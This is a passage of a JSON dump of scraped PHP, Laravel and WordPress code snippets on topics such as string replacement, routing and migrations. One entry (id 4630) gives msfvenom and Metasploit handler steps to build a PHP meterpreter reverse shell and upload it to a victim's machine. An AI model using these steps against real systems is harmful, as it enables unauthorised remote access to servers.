    "description": "<?php $stripped = str_replace(' ', '', \"10 1000 0000 000\"); echo $stripped;\n<?php $phone = preg_replace( '/\\s+/', '', \"01234 567890\" ); echo $phone;\n$string = preg_replace('/\\s+/', '', $string);\n$str = \"\\n\\n\\nHello World!\\n\\n\\n\"; echo \"With trim: \" . trim($str);\n//remove all white spaces from a string $whatonearth=preg_replace('/\\s/','',\"what o n   ear th\");\n{{ \\Illuminate\\Support\\Str::limit($productVal, 20, $end='...') }}\n",
    "reg_date": "2021-10-12T10:20:03.000Z"
  },
  {
    "id": 4597,
    "keyword": null,
    "link": null,
    "title": " remove woocommerce styles",
    "description": "<?php //* Do NOT include the opening php tag shown above. Copy the code shown below into functions.php  /**  * Manage WooCommerce styles and scripts.  */ function grd_woocommerce_script_cleaner() { \t \t// Remove the generator tag \tremove_action( 'wp_head', array( $GLOBALS['woocommerce'], 'generator' ) );  \t// Unless we're in the store, remove all the cruft! \tif ( ! is_woocommerce() && ! is_cart() && ! is_checkout() ) { \t\twp_dequeue_style( 'woocommerce_frontend_styles' ); \t\twp_dequeue_style( 'woocommerce-general'); \t\twp_dequeue_style( 'woocommerce-layout' ); \t\twp_dequeue_style( 'woocommerce-smallscreen' ); \t\twp_dequeue_style( 'woocommerce_fancybox_styles' ); \t\twp_dequeue_style( 'woocommerce_chosen_styles' ); \t\twp_dequeue_style( 'woocommerce_prettyPhoto_css' ); \t\twp_dequeue_script( 'selectWoo' ); \t\twp_deregister_script( 'selectWoo' ); \t\twp_dequeue_script( 'wc-add-payment-method' ); \t\twp_dequeue_script( 'wc-lost-password' ); \t\twp_dequeue_script( 'wc_price_slider' ); \t\twp_dequeue_script( 'wc-single-product' ); \t\twp_dequeue_script( 'wc-add-to-cart' ); \t\twp_dequeue_script( 'wc-cart-fragments' ); \t\twp_dequeue_script( 'wc-credit-card-form' ); \t\twp_dequeue_script( 'wc-checkout' ); \t\twp_dequeue_script( 'wc-add-to-cart-variation' ); \t\twp_dequeue_script( 'wc-single-product' ); \t\twp_dequeue_script( 'wc-cart' ); \t\twp_dequeue_script( 'wc-chosen' ); \t\twp_dequeue_script( 'woocommerce' ); \t\twp_dequeue_script( 'prettyPhoto' ); \t\twp_dequeue_script( 'prettyPhoto-init' ); \t\twp_dequeue_script( 'jquery-blockui' ); \t\twp_dequeue_script( 'jquery-placeholder' ); \t\twp_dequeue_script( 'jquery-payment' ); \t\twp_dequeue_script( 'fancybox' ); \t\twp_dequeue_script( 'jqueryui' ); \t} } add_action( 'wp_enqueue_scripts', 'grd_woocommerce_script_cleaner', 99 );\n",
    "reg_date": "2021-10-12T10:20:04.000Z"
  },
  {
    "id": 4598,
    "keyword": null,
    "link": null,
    "title": " rename file php",
    "description": " rename('old_filename.txt', 'new_filename.txt');\n<?php rename (\"/folder/file.ext\", \"newfile.ext\"); ?>  The above doesn't rename the file within the folder, as you might assume,  instead, it moves the file to whatever the PHP working directory is...  Chances are you'll not find it in your FTP tree.  Instead, use the following:  <?php rename (\"/folder/file.ext\", \"/folder/newfile.ext\"); ?>\n<?php  $oldname = 'readme.txt'; $newname = 'readme_v2.txt';  if (rename($oldname, $newname)) { \t$message = sprintf( \t\t'The file %s was renamed to %s successfully!', \t\t$oldname, \t\t$newname \t); } else { \t$message = sprintf( \t\t'There was an error renaming file %s', \t\t$oldname \t); }  echo $message; Code language: HTML, XML (xml)\n",
    "reg_date": "2021-10-12T10:20:04.000Z"
  },
  {
    "id": 4599,
    "keyword": null,
    "link": null,
    "title": " repeater acf",
    "description": "<?php  // ACF REPEATER - BASIC LOOP  // check if the repeater field has rows of data if( have_rows('repeater_field_name') ):   \t// loop through the rows of data     while ( have_rows('repeater_field_name') ) : the_row();          // display a sub field value         the_sub_field('sub_field_name');      endwhile;  else :      // no rows found  endif;  ?>\n<?php if( have_rows('repeater_field_name') ):  \twhile( have_rows('repeater_field_name') ): the_row();  \t\t$image = get_sub_field('image'); \tendwhile; endif; ?>\n<?php if( have_rows('repeater_field_name') ): ?>  \t<ul class=\"slides\">  \t<?php while( have_rows('repeater_field_name') ): the_row();   \t\t// vars \t\t$image = get_sub_field('image'); \t\t$content = get_sub_field('content'); \t\t$link = get_sub_field('link');  \t\t?>  \t\t<li class=\"slide\">  \t\t\t<?php if( $link ): ?> \t\t\t\t<a href=\"<?php echo $link; ?>\"> \t\t\t<?php endif; ?>  \t\t\t\t<img src=\"<?php echo $image['url']; ?>\" alt=\"<?php echo $image['alt'] ?>\" />  \t\t\t<?php if( $link ): ?> \t\t\t\t</a> \t\t\t<?php endif; ?>  \t\t    <?php echo $content; ?>  \t\t</li>  \t<?php endwhile; ?>  \t</ul>  <?php endif; ?>\n<?php if( have_rows('slides') ): ?>     <ul class=\"slides\">     <?php while( have_rows('slides') ): the_row();          $image = get_sub_field('image');         ?>         <li>             <?php echo wp_get_attachment_image( $image, 'full' ); ?>             <p><?php the_sub_field('caption'); ?></p>         </li>     <?php endwhile; ?>     </ul> <?php endif; ?>\n<?php  $rows = get_field('repeater_field_name'); if( $rows ) {     echo '<ul class=\"slides\">';     foreach( $rows as $row ) {         $image = $row['image'];         echo '<li>';             echo wp_get_attachment_image( $image, 'full' );             echo wpautop( $row['caption'] );         echo '</li>';     }     echo '</ul>'; }\n<?php   $rows = get_field('repeater_field_name'); if($rows) { \techo '<ul>';  \tforeach($rows as $row) \t{ \t\techo '<li>sub_field_1 = ' . $row['sub_field_1'] . ', sub_field_2 = ' . $row['sub_field_2'] .', etc</li>'; \t}  \techo '</ul>'; }\n",
    "reg_date": "2021-10-12T10:20:04.000Z"
  },
  {
    "id": 4600,
    "keyword": null,
    "link": null,
    "title": " replace accent php",
    "description": "$unwanted_array = array(    '&Scaron;'=>'S', '&scaron;'=>'s', 'Ž'=>'Z', 'ž'=>'z', '&Agrave;'=>'A', '&Aacute;'=>'A', '&Acirc;'=>'A', '&Atilde;'=>'A', '&Auml;'=>'A', '&Aring;'=>'A', '&AElig;'=>'A', '&Ccedil;'=>'C', '&Egrave;'=>'E', '&Eacute;'=>'E',                             '&Ecirc;'=>'E', '&Euml;'=>'E', '&Igrave;'=>'I', '&Iacute;'=>'I', '&Icirc;'=>'I', '&Iuml;'=>'I', '&Ntilde;'=>'N', '&Ograve;'=>'O', '&Oacute;'=>'O', '&Ocirc;'=>'O', '&Otilde;'=>'O', '&Ouml;'=>'O', '&Oslash;'=>'O', '&Ugrave;'=>'U',                             '&Uacute;'=>'U', '&Ucirc;'=>'U', '&Uuml;'=>'U', '&Yacute;'=>'Y', '&THORN;'=>'B', '&szlig;'=>'Ss', '&agrave;'=>'a', '&aacute;'=>'a', '&acirc;'=>'a', '&atilde;'=>'a', '&auml;'=>'a', '&aring;'=>'a', '&aelig;'=>'a', '&ccedil;'=>'c',                             '&egrave;'=>'e', '&eacute;'=>'e', '&ecirc;'=>'e', '&euml;'=>'e', '&igrave;'=>'i', '&iacute;'=>'i', '&icirc;'=>'i', '&iuml;'=>'i', '&eth;'=>'o', '&ntilde;'=>'n', '&ograve;'=>'o', '&oacute;'=>'o', '&ocirc;'=>'o', '&otilde;'=>'o',                             '&ouml;'=>'o', '&oslash;'=>'o', '&ugrave;'=>'u', '&uacute;'=>'u', '&ucirc;'=>'u', '&yacute;'=>'y', '&thorn;'=>'b', '&yuml;'=>'y' ); $str = strtr( $str, $unwanted_array ); \n",
    "reg_date": "2021-10-12T10:20:04.000Z"
  },
  {
    "id": 4601,
    "keyword": null,
    "link": null,
    "title": " replace all numbers in string php",
    "description": "str_replace ($search, $replace, $subject);\n$new_string = str_replace( $take_out, $put_in, $string);\n$words = preg_replace('/[0-9]+/', '', $words); \n",
    "reg_date": "2021-10-12T10:20:04.000Z"
  },
  {
    "id": 4602,
    "keyword": null,
    "link": null,
    "title": " replace all occurrence char in string php",
    "description": "//replaces every occurence of $search with $replace in the string $subject str_replace ($search, $replace, $subject);\n$string = str_replace('search','replace',$string); \n",
    "reg_date": "2021-10-12T10:20:04.000Z"
  },
  {
    "id": 4603,
    "keyword": null,
    "link": null,
    "title": " replace all php",
    "description": "//replaces every occurence of $search with $replace in the string $subject str_replace ($search, $replace, $subject);\n$vowels = array(\"a\", \"e\", \"i\", \"o\", \"u\", \"A\", \"E\", \"I\", \"O\", \"U\"); $onlyconsonants = str_replace($vowels, \"\", \"Hello World of PHP\"); // Fornece: Hll Wrld f PHP\n<?php $string = str_ireplace(\"FoX\", \"CAT\", \"the quick brown fox jumps over the lazy dog\"); echo $string; // the quick brown CAT jumps over the lazy dog ?>\n",
    "reg_date": "2021-10-12T10:20:04.000Z"
  },
  {
    "id": 4604,
    "keyword": null,
    "link": null,
    "title": " replace multiple characters one string php",
    "description": "str_replace(array(':', '\\\\', '/', '*'), ' ', $string); \n// Provides: You should eat pizza, beer, and ice cream every day $phrase  = \"You should eat fruits, vegetables, and fiber every day.\"; $healthy = [\"fruits\", \"vegetables\", \"fiber\"]; $yummy   = [\"pizza\", \"beer\", \"ice cream\"];  $newPhrase = str_replace($healthy, $yummy, $phrase);\n",
    "reg_date": "2021-10-12T10:20:04.000Z"
  },
  {
    "id": 4605,
    "keyword": null,
    "link": null,
    "title": " request type PHP $SERVER",
    "description": "$_SERVER[\"REQUEST_METHOD\"]\n",
    "reg_date": "2021-10-12T10:20:04.000Z"
  },
  {
    "id": 4606,
    "keyword": null,
    "link": null,
    "title": " request update password laravel",
    "description": " $obj_user->password = Hash::make($request_data['password'])\n",
    "reg_date": "2021-10-12T10:20:04.000Z"
  },
  {
    "id": 4607,
    "keyword": null,
    "link": null,
    "title": " request validate file laravel",
    "description": "    $validated = $request->validated();  use this:      public function createAccount(RegisterRequest $request)     {         $attr = $request->validated();  instead of :      public function createAccount(Request $request)     {         $attr = $request->validate([             'name' => 'required|string|max:255',             'email' => 'required|string|email|unique:users,email',             'password' => 'required|string|min:6|confirmed'         ]);   php artisan make:request RegisterRequest      public function rules()     {         return [             'name' => 'required|string|max:255',             'email' => 'required|string|email|unique:users,email',             'password' => 'required|string|min:6|confirmed'         ];     }\n/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */  public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\n       $messsages = array( \t\t'email.required'=>'You cant leave Email field empty', \t\t'name.required'=>'You cant leave name field empty',                 'name.min'=>'The field has to be :min chars long', \t);  \t$rules = array( \t\t'email'=>'required|unique:content', \t\t'name'=>'required|min:3', \t);  \t$validator = Validator::make(Input::all(), $rules,$messsages); \n",
    "reg_date": "2021-10-12T10:20:04.000Z"
  },
  {
    "id": 4608,
    "keyword": null,
    "link": null,
    "title": " require in php",
    "description": "// Include a file, if it can't be found: continue. <?php include 'mainfile.php'; ?>    // Alternatively: Require a file to be imported or quit if it can't be found <?php  require 'requiredfile.php'; ?>\n// Require a file to be imported or quit if it can't be found <?php  require 'requiredfile.php'; ?>\n// Require a file to be imported or quit if it can't be found <?php  require 'somefile.php'; ?>    // Alternatively: Include a file, if it can't be found: continue. <?php include 'vars.php'; ?>\n",
    "reg_date": "2021-10-12T10:20:05.000Z"
  },
  {
    "id": 4609,
    "keyword": null,
    "link": null,
    "title": " require once php",
    "description": "require_once('var.php');\n// Require_once is ignored if the required file has already been added by any of the include statements. <?php  require_once 'require_oncefile.php'; ?>\ndefine('__ROOT__', dirname(dirname(__FILE__))); require_once(__ROOT__.'whatever');\ndefine('__ROOT__', dirname(dirname(__FILE__))); //call define untill you get to the root directory require_once (__ROOT__.\"/Path/To/File.php\"); //append __ROOT__ to the string\n",
    "reg_date": "2021-10-12T10:20:05.000Z"
  },
  {
    "id": 4610,
    "keyword": null,
    "link": null,
    "title": " required false , form type",
    "description": "$builder->add('name', null, [     'required'   => false,     'empty_data' => 'John Doe', ]); \n",
    "reg_date": "2021-10-12T10:20:05.000Z"
  },
  {
    "id": 4611,
    "keyword": null,
    "link": null,
    "title": " required if laravel",
    "description": "\"sale_price\" => \"required_if:list_type,==,selling\" \n        $request->validate([             'daily_movement_id'=>'required_with:daily_movement',             'daily_movement'=>'required_with:daily_movement_id',         ]); //////////////////////////////////////////////////////         $request->validate([             'daily_movement_id'=>'required_without:daily_movement',             'daily_movement'=>'required_without:daily_movement_id',         ]);\npublic function rules()  {     return [       'reclamo_procede'  => 'max:1',                    'solucion_minutos' => 'required_if:reclamo_procede,==,si',      ];  }\n",
    "reg_date": "2021-10-12T10:20:05.000Z"
  },
  {
    "id": 4612,
    "keyword": null,
    "link": null,
    "title": " required php extension 'gd' was not loaded",
    "description": "sudo apt-get install php7.4-gd \n",
    "reg_date": "2021-10-12T10:20:05.000Z"
  },
  {
    "id": 4613,
    "keyword": null,
    "link": null,
    "title": " rerun migration and seed",
    "description": "php artisan migrate:refresh  php artisan migrate:refresh --seed\n",
    "reg_date": "2021-10-12T10:20:05.000Z"
  },
  {
    "id": 4614,
    "keyword": null,
    "link": null,
    "title": " reset array keys php",
    "description": "$arr = array_values($arr)\nunset($foo[0]); // remove item at index 0 $foo2 = array_values($foo); // 'reindex' array\nforeach($input as &$val) {    $val = array_values($val); }\n",
    "reg_date": "2021-10-12T10:20:05.000Z"
  },
  {
    "id": 4615,
    "keyword": null,
    "link": null,
    "title": " reset password multipple database laravel",
    "description": " 'passwords' => [         'users' => [             'provider' => 'users',             'table' => 'password_resets',             'connection' => 'mysql',             'expire' => 60,         ],     ], \n",
    "reg_date": "2021-10-12T10:20:05.000Z"
  },
  {
    "id": 4616,
    "keyword": null,
    "link": null,
    "title": " reset wp query",
    "description": "wp_reset_query();\n",
    "reg_date": "2021-10-12T10:20:05.000Z"
  },
  {
    "id": 4617,
    "keyword": null,
    "link": null,
    "title": " rest api pagination example php",
    "description": "{     \"_links\": {         \"self\": {             \"href\": \"http://example.org/api/user?page=3\"         },         \"first\": {             \"href\": \"http://example.org/api/user\"         },         \"prev\": {             \"href\": \"http://example.org/api/user?page=2\"         },         \"next\": {             \"href\": \"http://example.org/api/user?page=4\"         },         \"last\": {             \"href\": \"http://example.org/api/user?page=133\"         }     }     \"count\": 3,     \"total\": 498,     \"_embedded\": {         \"users\": [             {                 \"_links\": {                     \"self\": {                         \"href\": \"http://example.org/api/user/mwop\"                     }                 },                 \"id\": \"mwop\",                 \"name\": \"Matthew Weier O'Phinney\"             },             {                 \"_links\": {                     \"self\": {                         \"href\": \"http://example.org/api/user/mac_nibblet\"                     }                 },                 \"id\": \"mac_nibblet\",                 \"name\": \"Antoine Hedgecock\"             },             {                 \"_links\": {                     \"self\": {                         \"href\": \"http://example.org/api/user/spiffyjr\"                     }                 },                 \"id\": \"spiffyjr\",                 \"name\": \"Kyle Spraggs\"             }         ]     } }\n",
    "reg_date": "2021-10-12T10:20:05.000Z"
  },
  {
    "id": 4618,
    "keyword": null,
    "link": null,
    "title": " retrieving a cookie in php",
    "description": "//Cookies //Cookies are stored on the client side. cookies are not as secure as sessions //and it is recommended that you use sessions as much as possible. ==================== Version 1 for cookies ====================  <?php if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }   ==================== Version 2 for cookies ==================== <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }  ======================= Version 3 for cookies =======================  <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day     //to unset a cookie just set the time that is already past     //delete cookie     setcookie('nameofcookie','Frank', time() -3600);  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }  ========================= Version 4 check for cookies ========================= <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day      if(count($_COOKIE) > 0){         echo 'There are ' . count($_COOKIE)  .  ' cookies saved<br>';         }else{             echo 'There are no cookies saved<br>';         }  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; } \n//Cookies //Cookies are stored on the client side. cookies are not as secure as sessions //and it is recommended that you use sessions as much as possible. //save addional information as an array in a cookie <?php     $user = ['name' => 'Brad', 'email' => 'test@test.com', 'age' = 35];      $user = serialize($user);      setcookie('user', $user, time() + (86400 *30));          $user = unserialize($_COOKIE['user']);      echo $user['name'];\n$cookiename = $_COOKIE['COOKIE ID']\n",
    "reg_date": "2021-10-12T10:20:06.000Z"
  },
  {
    "id": 4619,
    "keyword": null,
    "link": null,
    "title": " retrive acf from taxonomy",
    "description": "<?php // ACF in Taxonomy  // get the current taxonomy term $term = get_queried_object();   // vars $image = get_field('image', $term); $color = get_field('color', $term);  ?> <style type=\"text/css\"> \t \t.entry-title a { \t\tcolor: <?php echo $color; ?>; \t} \t \t<?php if( $image ): ?> \t.site-header { \t\tbackground-image: url(<?php echo $image['url']; ?>); \t} \t<?php endif; ?> \t </style> <div class=\"wrap\"> \t \t<?php // Remaining template removed from example ?>\n",
    "reg_date": "2021-10-12T10:20:06.000Z"
  },
  {
    "id": 4620,
    "keyword": null,
    "link": null,
    "title": " return back in blade laravel",
    "description": "{{ url()->previous() }} \n",
    "reg_date": "2021-10-12T10:20:06.000Z"
  },
  {
    "id": 4621,
    "keyword": null,
    "link": null,
    "title": " return last insert id in codeigniter",
    "description": "$id = $this->db->insert_id();\nfunction add_post($post_data){    $this->db->insert('posts', $post_data);    $insert_id = $this->db->insert_id();     return  $insert_id; }\n$last_inserted_id = $this->db->insert_id();\n",
    "reg_date": "2021-10-12T10:20:06.000Z"
  },
  {
    "id": 4622,
    "keyword": null,
    "link": null,
    "title": " return last inserted id in laravel",
    "description": "$id = DB::table('users')->insertGetId([     'email' => 'john@example.com',     'votes' => 0 ]); \nDB::getPdo()->lastInsertId(); \n",
    "reg_date": "2021-10-12T10:20:06.000Z"
  },
  {
    "id": 4623,
    "keyword": null,
    "link": null,
    "title": " return php",
    "description": "function getXYZ() {     return array(4,5,6); }  list($x,$y,$z) = getXYZ();  // Afterwards: $x == 4 && $y == 5 && $z == 6 // (This will hold for all samples unless otherwise noted)\n",
    "reg_date": "2021-10-12T10:20:06.000Z"
  },
  {
    "id": 4624,
    "keyword": null,
    "link": null,
    "title": " return redirect with message laravel",
    "description": "return Redirect::back()->withErrors(['msg', 'The Message']);  and inside your view call this  @if($errors->any()) <h4>{{$errors->first()}}</h4> @endif\nreturn redirect()->back()->withInput(); \nRoute::post('user/profile', function () {     // Update the user's profile...      return redirect('dashboard')->with('status', 'Profile updated!'); });\n//redirct to previous page with message at a specific setion :) return redirect(url()->previous() .'#comments')->with('success', 'Data Your Comment has been created successfully');\n// For a route with the following URI: profile/{id}  return redirect()->route('profile', [$user]);\n// For a route with the following URI: profile/{id}  return redirect()->route('profile', ['id' => 1]);\n",
    "reg_date": "2021-10-12T10:20:06.000Z"
  },
  {
    "id": 4625,
    "keyword": null,
    "link": null,
    "title": " return response array laravel",
    "description": "return response()->json($array);  return response()->json(array(...));  return response()->json([                     'details' => $shipment,                     'billersEmails' => $billToEmail                 ]);\n",
    "reg_date": "2021-10-12T10:20:07.000Z"
  },
  {
    "id": 4626,
    "keyword": null,
    "link": null,
    "title": " return two variables php",
    "description": "function getXYZ() {     return array(4,5,6); }  list($x,$y,$z) = getXYZ();  // Afterwards: $x == 4 && $y == 5 && $z == 6 // (This will hold for all samples unless otherwise noted)\n// Function to swap two numbers  function swap( $x, $y ) {       return array( $y, $x );  }  \n",
    "reg_date": "2021-10-12T10:20:07.000Z"
  },
  {
    "id": 4627,
    "keyword": null,
    "link": null,
    "title": " return view with variable laravel",
    "description": "$html = view('users.edit', compact('user'))->render(); \nreturn View::make('blog')->with('posts', $posts);\nRoute::get(\"/page\", function(){    return View::make(\"dir.page\"); });\nRoute::get('/', function () {     return view('greeting', ['name' => 'James']); });\n",
    "reg_date": "2021-10-12T10:20:07.000Z"
  },
  {
    "id": 4628,
    "keyword": null,
    "link": null,
    "title": " reverse a string in php",
    "description": "<?php   echo strrev(\"Hello World!\"); ?>\nuse strrev(); function\n",
    "reg_date": "2021-10-12T10:20:07.000Z"
  },
  {
    "id": 4629,
    "keyword": null,
    "link": null,
    "title": " reverse array laravel",
    "description": "$a = array( \"a\" => \"Volvo\", \"b\" => \"BMW\", \"c\" => \"Toyota\" ); array_reverse($a) #output : Array ( [c] => Toyota, [b] => BMW, [a] => Volvo )  \n",
    "reg_date": "2021-10-12T10:20:07.000Z"
  },
  {
    "id": 4630,
    "keyword": null,
    "link": null,
    "title": " reverse php shell pentestmonkey",
    "description": "##This will create the payload file \"shell.php\" with your ip and port. msfvenom -p php/meterpreter/reverse_tcp LHOST=<$LOCAL_IP> LPORT=<$LOCAL_PORT> -f raw -o shell.php ##You can always \"nano\" the file to change your ipaddr and port incase you messed up the first step. #Run 'msfconsole' to start the listener then run the following command. use exploit/multi/handler  set PAYLOAD php/meterpreter/reverse_tcp #set your ipaddr set LHOST <$LOCAL_IP> #set your listening port set LPORT <$LOCAL_PORT> #\"show options\" to check ur steps then run the command \"exploit\" exploit #this will start the listener #Upload \"shell.php\" to your victim's machine. #The victim's machine will need to run the file to connect back to your machine.\n",
    "reg_date": "2021-10-12T10:20:07.000Z"
  },
  {
    "id": 4631,
    "keyword": null,
    "link": null,
    "title": " rewrite .php to no extension",
    "description": "RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^([^\\.]+)$ $1.php [NC,L] \n",
    "reg_date": "2021-10-12T10:20:07.000Z"
  },
  {
    "id": 4632,
    "keyword": null,
    "link": null,
    "title": " rollback laravel transaction",
    "description": "DB::beginTransaction();  try {     DB::insert(...);     DB::insert(...);     DB::insert(...);      DB::commit();     // all good } catch (\\Exception $e) {     DB::rollback();     // something went wrong }\n",
    "reg_date": "2021-10-12T10:20:07.000Z"
  },
  {
    "id": 4633,
    "keyword": null,
    "link": null,
    "title": " root directory in php",
    "description": "function getHtmlRootFolder(string $root = '/var/www/') {      // -- try to use DOCUMENT_ROOT first --     $ret = str_replace(' ', '', $_SERVER['DOCUMENT_ROOT']);     $ret = rtrim($ret, '/') . '/';      // -- if doesn't contain root path, find using this file's loc. path --     if (!preg_match(\"#\".$root.\"#\", $ret)) {       $root = rtrim($root, '/') . '/';       $root_arr = explode(\"/\", $root);       $pwd_arr = explode(\"/\", getcwd());       $ret = $root . $pwd_arr[count($root_arr) - 1];     }      return (preg_match(\"#\".$root.\"#\", $ret)) ? rtrim($ret, '/') . '/' : null; } \n",
    "reg_date": "2021-10-12T10:20:07.000Z"
  },
  {
    "id": 4634,
    "keyword": null,
    "link": null,
    "title": " round to 2 decimal places php",
    "description": "round(520.34345, 2);   // 520.34\n",
    "reg_date": "2021-10-12T10:20:07.000Z"
  },
  {
    "id": 4635,
    "keyword": null,
    "link": null,
    "title": " round up built in function php",
    "description": "// round down echo floor(1.5); // prints 1  // round up echo ceil(1.5); // prints 2\necho ceil(0.5); //Prints 1\n <?php echo 'Rounding modes with 9.5' . PHP_EOL; var_dump(round(9.5, 0, PHP_ROUND_HALF_UP)); var_dump(round(9.5, 0, PHP_ROUND_HALF_DOWN)); var_dump(round(9.5, 0, PHP_ROUND_HALF_EVEN)); var_dump(round(9.5, 0, PHP_ROUND_HALF_ODD));  echo 'Rounding modes with 8.5' . PHP_EOL; var_dump(round(8.5, 0, PHP_ROUND_HALF_UP)); var_dump(round(8.5, 0, PHP_ROUND_HALF_DOWN)); var_dump(round(8.5, 0, PHP_ROUND_HALF_EVEN)); var_dump(round(8.5, 0, PHP_ROUND_HALF_ODD)); ?>  \n",
    "reg_date": "2021-10-12T10:20:08.000Z"
  },
  {
    "id": 4636,
    "keyword": null,
    "link": null,
    "title": " route:: \"resourceverbs([]);\" Class 'App\\Providers\\Route' not found",
    "description": " /**As I see this question has not been answered for over a month now, * *Go to the file where you've used Route::method_name() and import Route class there by-> */  use Route;  //This is common in App\\Providers\\AppServiceProvider@boot() that implements  Route::resourceVerbs([...]);  //Let me know if this helps\n//try to import class bellow namespace use Route;\n",
    "reg_date": "2021-10-12T10:20:08.000Z"
  },
  {
    "id": 4637,
    "keyword": null,
    "link": null,
    "title": " route codeigniter",
    "description": "$route['produk/(:num)/([a-z]+)'] = 'HomeControl/detail_produk/$1';\n",
    "reg_date": "2021-10-12T10:20:08.000Z"
  },
  {
    "id": 4638,
    "keyword": null,
    "link": null,
    "title": " route optional parameter laravel",
    "description": "Route::get('user/{name?}', function ($name = null) {     return $name; });  Route::get('user/{name?}', function ($name = 'John') {     return $name; }); \nRoute::match(['get', 'post'], '/', function () {     // });  Route::any('/', function () {     // });\nRoute::get('user/profile', [UserProfileController::class, 'show'])->name('profile');\nRoute::get('/sample/{param?}', 'SampleController@index');\n// You can make a parameter optional by placing a '?' after the parameter name. // Make sure to give the route's corresponding variable a default value: Route::get('user/{name?}', function ($name = null) {     return $name; });  Route::get('user/{name?}', function ($name = 'John') {     return $name; });\nRoute::get('user/{name?}', function ($name = null) {     return $name; });  Route::get('user/{name?}', function ($name = 'John') {     return $name; });\n",
    "reg_date": "2021-10-12T10:20:08.000Z"
  },
  {
    "id": 4639,
    "keyword": null,
    "link": null,
    "title": " route resource laravel",
    "description": "php artisan make:controller MyController\n// Implicit Model Binding Routes can be created with one line using either: Route::resource('photos', PhotoController::class); // OR Route::resources([ \t'photos' => PhotoController::class,     'posts' => PostController::class, ]);  php artisan make:controller PhotoController --resource --model=Photo   // makes a controller with stubouts for methods:   // index   // create   // store   // show   // edit   // update   // destroy \nRoute::resources([     'photos' => 'PhotoController',     'posts' => 'PostController', ]);\nBy default, all resource controller actions have a route name; however, you can override these names by passing a names array with your desired route names:  use App\\Http\\Controllers\\PhotoController;  Route::resource('photos', PhotoController::class)->names([     'create' => 'photos.build' ]);\nVerb          Path                        Action  Route Name GET           /users                      index   users.index GET           /users/create               create  users.create POST          /users                      store   users.store GET           /users/{user}               show    users.show GET           /users/{user}/edit          edit    users.edit PUT|PATCH     /users/{user}               update  users.update DELETE        /users/{user}               destroy users.destroy\nphp artisan make:controller PhotoController --resource --model=Photo\n",
    "reg_date": "2021-10-12T10:20:08.000Z"
  },
  {
    "id": 4640,
    "keyword": null,
    "link": null,
    "title": " route resources",
    "description": "Verb          Path                        Action  Route Name GET           /users                      index   users.index GET           /users/create               create  users.create POST          /users                      store   users.store GET           /users/{user}               show    users.show GET           /users/{user}/edit          edit    users.edit PUT|PATCH     /users/{user}               update  users.update DELETE        /users/{user}               destroy users.destroy\n",
    "reg_date": "2021-10-12T10:20:08.000Z"
  },
  {
    "id": 4641,
    "keyword": null,
    "link": null,
    "title": " row count in codeigniter",
    "description": "$this->db->where('EmpID >=', 5); $query = $this->db->get('Employees'); echo $query->num_rows();  // Outputs, 4 \n$this->db   ->where(['field'=>'foo'])   ->from(\"tablename\")   ->count_all_results();  //OR  $this->db   ->where(['field'=>'foo'])   ->count_all_results(\"tablename\");\n",
    "reg_date": "2021-10-12T10:20:08.000Z"
  },
  {
    "id": 4642,
    "keyword": null,
    "link": null,
    "title": " rtl file manager laravel",
    "description": "run the       php artisan vendor:publish --tag=lfm_config   php artisan vendor:publish --tag=lfm_public   php artisan route:clear   php artisan config:clear      command    and choose LFM vendor view files to publish   and in the vendor/laravel-filemanager/index.blade.php file change dir=\"rtl\".\n",
    "reg_date": "2021-10-12T10:20:08.000Z"
  },
  {
    "id": 4643,
    "keyword": null,
    "link": null,
    "title": " run a php site",
    "description": "cd path/to/your/app php -S localhost:8000\nphp -S 127.0.0.1:8000\n",
    "reg_date": "2021-10-12T10:20:08.000Z"
  },
  {
    "id": 4644,
    "keyword": null,
    "link": null,
    "title": " run a server php terminal",
    "description": "$ cd ~/public_html $ php -S localhost:8000\n",
    "reg_date": "2021-10-12T10:20:09.000Z"
  },
  {
    "id": 4645,
    "keyword": null,
    "link": null,
    "title": " run a server php with a specific folder terminal",
    "description": "$ cd ~/public_html $ php -S localhost:8000 -t foo/\n",
    "reg_date": "2021-10-12T10:20:09.000Z"
  },
  {
    "id": 4646,
    "keyword": null,
    "link": null,
    "title": " run artisan command from controller",
    "description": "If you have simple job to do you can do it from route file.  For example you want to clear cache. In terminal it would be php artisan  cache:clear In route file that would be:  \\Artisan::call('cache:clear');\n<?php Route::get('/foo', function () {     Artisan::queue('email:send', [         'user' => 1, '--queue' => 'default'     ]);     // });\n// call artisan command \\Artisan::call(\"syncdb:sales-item\");\n <?php  namespace App\\Console\\Commands;  use Illuminate\\Console\\Command; use App\\Http\\Controllers\\HelloWorldController;  class MakeImportsCommand extends Command {     /**      * The name and signature of the console command.      *      * @var string      */     protected $signature = 'helloworld';      /**      * The console command description.      *      * @var string      */     protected $description = 'Say Hello World Controller';      /**      * Create a new command instance.      *      * @return void      */     public function __construct()     {         parent::__construct();     }      /**      * Execute the console command.      *      * @return mixed      */     public function handle()     {         return $this -> helloWorld();      } } \n",
    "reg_date": "2021-10-12T10:20:09.000Z"
  },
  {
    "id": 4647,
    "keyword": null,
    "link": null,
    "title": " run jobs laravel",
    "description": "php artisan queue:work --queue=high,default\nuse Illuminate\\Support\\Facades\\Redis;  /**  * Execute the job.  *  * @return void  */ public function handle() {     Redis::throttle('key')->block(0)->allow(1)->every(5)->then(function () {         info('Lock obtained...');          // Handle job...     }, function () {         // Could not obtain lock...          return $this->release(5);     }); }\n",
    "reg_date": "2021-10-12T10:20:09.000Z"
  },
  {
    "id": 4648,
    "keyword": null,
    "link": null,
    "title": " run laravel mix",
    "description": "npm run dex\nmix.webpackConfig({} || cb); \n",
    "reg_date": "2021-10-12T10:20:09.000Z"
  },
  {
    "id": 4649,
